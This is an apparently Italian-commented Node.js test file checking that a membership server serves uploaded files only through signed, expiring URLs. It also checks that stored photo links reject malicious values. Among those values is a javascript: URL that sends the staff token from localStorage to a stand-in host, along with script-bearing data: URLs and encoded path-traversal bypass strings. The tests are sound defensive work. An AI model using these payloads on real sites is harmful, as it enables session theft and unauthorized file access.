// I file caricati non si aprono più conoscendo l'indirizzo.
//
// Erano serviti da `/uploads/*` senza alcun controllo. Il nome è casuale, quindi non si
// indovina — ma un indirizzo si condivide, finisce in una cronologia, nel log di un proxy,
// in uno screenshot. E fra quei file ci sono le foto dei soci: dati personali.
// "Difficile da indovinare" non è un controllo d'accesso, ed è il motivo per cui questo
// test esiste.
import test, { before, after, describe } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, rmSync, mkdirSync, existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildApp } from '../src/app.js';
import bcrypt from 'bcryptjs';
import { inArray } from 'drizzle-orm';
import { db, pool } from '../src/db/client.js';
import { staffAccounts, members } from '../src/db/schema/index.js';
import { config } from '../src/config.js';
import { firmaUrl, togliFirma, firmaValida, nomeFileDa } from '../src/lib/urlFirmati.js';

const serverRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const UPLOAD_DIR = config.uploadDir || path.join(serverRoot, 'uploads');
const NOME = '__prova-file-protetti.txt';
const SONDA = path.join(UPLOAD_DIR, NOME);

let app;

before(async () => {
	app = buildApp({ logger: false });
	await app.ready();
	mkdirSync(UPLOAD_DIR, { recursive: true });
	writeFileSync(SONDA, 'contenuto riservato');
});

after(async () => {
	rmSync(SONDA, { force: true });
	await app.close();
	await pool.end();
});

const chiedi = (url) => app.inject({ method: 'GET', url });

describe("aprire un file caricato", () => {
	test("senza firma non si apre, e non si dice nemmeno che esiste", async () => {
		const risposta = await chiedi(`/uploads/${NOME}`);

		// 404 e non 403: a chi non può vederlo non si conferma l'esistenza del file.
		assert.equal(risposta.statusCode, 404);
		assert.ok(!risposta.body.includes('riservato'), 'il contenuto è uscito lo stesso');
	});

	test('con la firma giusta si apre', async () => {
		const firmato = firmaUrl(`/uploads/${NOME}`);
		const risposta = await chiedi(firmato);

		assert.equal(risposta.statusCode, 200, firmato);
		assert.equal(risposta.body, 'contenuto riservato');
	});

	test('con una firma alterata non si apre', async () => {
		const firmato = firmaUrl(`/uploads/${NOME}`);
		const manomesso = firmato.replace(/firma=(.)/, (_, primo) => `firma=${primo === 'a' ? 'b' : 'a'}`);

		assert.equal((await chiedi(manomesso)).statusCode, 404);
	});

	test('la firma di un file non vale per un altro', async () => {
		const altro = firmaUrl('/uploads/un-altro-file.pdf');
		const parametri = altro.split('?')[1];

		assert.equal((await chiedi(`/uploads/${NOME}?${parametri}`)).statusCode, 404);
	});

	test('una firma scaduta non vale', async () => {
		// Firmata come se fossimo un mese fa: la scadenza è già passata.
		const unMeseFa = Date.now() - 30 * 24 * 60 * 60 * 1000;
		const vecchia = firmaUrl(`/uploads/${NOME}`, unMeseFa);

		assert.equal((await chiedi(vecchia)).statusCode, 404);
	});

	// Il router decodifica l'indirizzo prima di scegliere la rotta: un controllo fatto sul
	// testo grezzo si aggirava scrivendo `/uploads/` in un altro modo. `/%75ploads/` (`%75` è
	// la `u`) serviva il file senza firma.
	test("scritto in un altro modo, l'indirizzo non si apre lo stesso", async () => {
		const varianti = [
			`/%75ploads/${NOME}`,
			`/%75%70%6c%6f%61%64%73/${NOME}`,
			`/uploads/%5f%5fprova-file-protetti.txt`,
			`/uploads%2F${NOME}`,
			`/%2Fuploads/${NOME}`,
			`//uploads/${NOME}`,
			`/./uploads/${NOME}`,
			`/x/../uploads/${NOME}`,
			`/UPLOADS/${NOME}`,
		];
		for (const url of varianti) {
			const risposta = await chiedi(url);
			assert.ok(!risposta.body.includes('riservato'), `file servito senza firma con ${url} (${risposta.statusCode})`);
		}
	});

	test("la firma non si porta da un file a un percorso con dentro una barra", async () => {
		// Il nome firmato è sempre un nome solo: un percorso annidato non è un nostro file.
		const firmato = firmaUrl(`/uploads/sotto/${NOME}`);
		assert.equal((await chiedi(firmato)).statusCode, 404);
	});

	// Le intestazioni che impedivano a un file caricato di comportarsi da pagina del nostro
	// dominio devono restare: il controllo d'accesso si aggiunge, non sostituisce.
	test('un file aperto resta senza permessi', async () => {
		const risposta = await chiedi(firmaUrl(`/uploads/${NOME}`));

		assert.equal(risposta.headers['content-security-policy'], "default-src 'none'; sandbox");
		assert.equal(risposta.headers['x-content-type-options'], 'nosniff');
	});
});

// Il giro completo, che è la parte che si rompe davvero: la firma non serve a niente se
// l'indirizzo che arriva alle schermate non ce l'ha. Le pagine mettono la foto del socio in un
// `<img src>` così com'è, e se uscisse nuda la foto non si aprirebbe più. (Prima il giro si
// provava sui documenti, usciti dall'applicazione a novembre 2026: ora sulla foto.)
describe("l'indirizzo che arriva alle schermate è già firmato", () => {
	let idSocio;
	let idAccount;
	let token;
	const idAltri = [];
	const PASSWORD = 'prova-file-protetti-1234';
	const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
	const codice = () => `FP${String(Date.now() + idAltri.length).replace(/\d/g, (c) => 'ABCDEFGHIJ'[c])}`;
	const socioConFoto = async (foto) => {
		const [socio] = await db.insert(members).values({ nome: 'Prova', cognome: 'File Protetti', codiceSocio: codice(), fotoUrl: foto }).returning();
		idAltri.push(socio.id);
		return socio.id;
	};

	before(async () => {
		// Il test si costruisce il proprio account e lo cancella: non dipende da com'è
		// popolato il database in cui gira.
		const email = `firma.file.${Date.now()}@test.local`;
		const [account] = await db
			.insert(staffAccounts)
			.values({ nome: 'Admin Firma File', email, passwordHash: await bcrypt.hash(PASSWORD, 4), ruolo: 'admin' })
			.returning();
		idAccount = account.id;
		const [socio] = await db
			.insert(members)
			.values({ nome: 'Prova', cognome: 'File Protetti', codiceSocio: codice(), fotoUrl: `https://gripcore.it/uploads/${NOME}` })
			.returning();
		idSocio = socio.id;
		token = (await app.inject({ method: 'POST', url: '/api/auth/login', payload: { email, password: PASSWORD } })).json().token;
	});

	after(async () => {
		await db.delete(members).where(inArray(members.id, [idSocio, ...idAltri].filter(Boolean)));
		if (idAccount) await db.delete(staffAccounts).where(inArray(staffAccounts.id, [idAccount]));
	});

	test('la foto esce firmata e si apre', async () => {
		const url = (await scrivi('GET', `/api/entities/Member/${idSocio}`)).json().foto_url;
		assert.match(url, /firma=/, "l'indirizzo è uscito senza firma: la foto non si aprirebbe");
		assert.equal((await chiedi(url.replace('https://gripcore.it', ''))).statusCode, 200);
	});

	test('risalvando non si porta la firma nel database', async () => {
		// È quello che fa il gestionale: rilegge l'indirizzo, lo mette nel modulo e lo risalva. Se
		// la firma entrasse nel database, la foto smetterebbe di aprirsi qualche ora dopo.
		const letto = (await scrivi('GET', `/api/entities/Member/${idSocio}`)).json();
		const salvato = await scrivi('PUT', `/api/entities/Member/${idSocio}`, { foto_url: letto.foto_url });
		assert.equal(salvato.statusCode, 200, salvato.body);
		const rileggi = (await scrivi('GET', `/api/entities/Member/${idSocio}`)).json();
		// Una firma sola, non una firma sopra l'altra.
		assert.equal((rileggi.foto_url.match(/firma=/g) ?? []).length, 1);
		assert.equal(togliFirma(rileggi.foto_url), `https://gripcore.it/uploads/${NOME}`);
	});

	// Le schermate mettono gli indirizzi dei file in un `src` o un `href`, e React non blocca
	// `javascript:`: entra solo un file caricato da noi.
	test('un indirizzo che non è un nostro file non entra', async () => {
		const cattivi = [
			"javascript:fetch('https://esempio.it/?t='+localStorage.grip_staff_token)",
			'JavaScript:alert(1)',
			'data:text/html,<script>alert(1)</script>',
			'https://esempio.it/malevolo.png',
			'/uploads/../index.html',
			'/uploads/sotto/file.png',
		];
		for (const foto_url of cattivi) {
			const modificato = await scrivi('PUT', `/api/entities/Member/${idSocio}`, { foto_url });
			assert.equal(modificato.statusCode, 400, `modifica accettata con ${foto_url}`);
			assert.match(modificato.json().error, /file/);
		}
	});

	// "Non si può recuperare", diceva la conferma: ma il file restava sul disco. Un file
	// sostituito va cancellato davvero.
	test('un file sostituito sparisce dal disco', async () => {
		const vecchio = `__prova-vecchio-${Date.now()}.png`;
		const nuovo = `__prova-nuovo-${Date.now()}.png`;
		writeFileSync(path.join(UPLOAD_DIR, vecchio), 'x');
		writeFileSync(path.join(UPLOAD_DIR, nuovo), 'y');
		const id = await socioConFoto(`/uploads/${vecchio}`);
		assert.equal((await scrivi('PUT', `/api/entities/Member/${id}`, { foto_url: `/uploads/${nuovo}` })).statusCode, 200);
		assert.equal(existsSync(path.join(UPLOAD_DIR, vecchio)), false, 'il file sostituito è rimasto');
		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), true);
		assert.equal((await scrivi('PUT', `/api/entities/Member/${id}`, { foto_url: null })).statusCode, 200, 'vuoto vuol dire "nessun file"');
		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), false, 'il file tolto è rimasto');
	});

	test('un file citato anche da un’altra riga non si cancella', async () => {
		const condiviso = `__prova-condiviso-${Date.now()}.png`;
		writeFileSync(path.join(UPLOAD_DIR, condiviso), 'z');
		const a = await socioConFoto(`/uploads/${condiviso}`);
		const b = await socioConFoto(`/uploads/${condiviso}`);
		await scrivi('PUT', `/api/entities/Member/${a}`, { foto_url: null });
		assert.equal(existsSync(path.join(UPLOAD_DIR, condiviso)), true, "l'altra riga lo usa ancora");
		await scrivi('PUT', `/api/entities/Member/${b}`, { foto_url: null });
		assert.equal(existsSync(path.join(UPLOAD_DIR, condiviso)), false);
	});
});

describe('la firma, come pezzo a sé', () => {
	test("lo stesso file ha lo stesso indirizzo per un'ora", () => {
		// Se cambiasse a ogni lettura, la cache del browser non servirebbe a niente e la
		// foto di ogni socio verrebbe riscaricata a ogni apertura della pagina.
		// Un istante fisso a metà dell'ora: la scadenza è arrotondata all'ora, e con
		// `Date.now()` negli ultimi cinque minuti di ogni ora `adesso + 5 min` cadrebbe
		// nell'ora dopo e il test fallirebbe senza che il codice sia sbagliato.
		const adesso = Date.UTC(2026, 0, 1, 10, 30);
		assert.equal(
			firmaUrl(`/uploads/${NOME}`, adesso),
			firmaUrl(`/uploads/${NOME}`, adesso + 5 * 60 * 1000)
		);
	});

	test('togliere la firma riporta l’indirizzo di partenza', () => {
		const nudo = `https://gripcore.it/uploads/${NOME}`;
		assert.equal(togliFirma(firmaUrl(nudo)), nudo);
	});

	test('quello che non è un file caricato non viene toccato', () => {
		assert.equal(firmaUrl('https://esempio.it/logo.png'), 'https://esempio.it/logo.png');
		assert.equal(nomeFileDa('https://esempio.it/logo.png'), null);
		assert.equal(firmaUrl(null), null);
	});

	test('una firma senza scadenza o senza valore non passa', () => {
		assert.equal(firmaValida(NOME, undefined, 'abc'), false);
		assert.equal(firmaValida(NOME, Date.now() + 1000, undefined), false);
		assert.equal(firmaValida(NOME, 'domani', 'abc'), false);
	});
});
